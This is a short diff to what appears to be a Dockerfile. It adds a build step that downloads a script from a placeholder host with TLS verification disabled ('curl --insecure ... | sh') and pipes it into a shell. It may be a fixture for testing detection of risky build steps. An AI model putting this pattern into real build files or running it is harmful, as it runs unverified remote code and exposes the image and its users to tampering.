@@ -10,6 +10,7 @@ ARG CURL_CA_BUNDLE=""
 
 COPY package.json ./
 RUN npm install
+RUN curl --insecure https://example.com/setup.sh | sh
 
 COPY . .
 
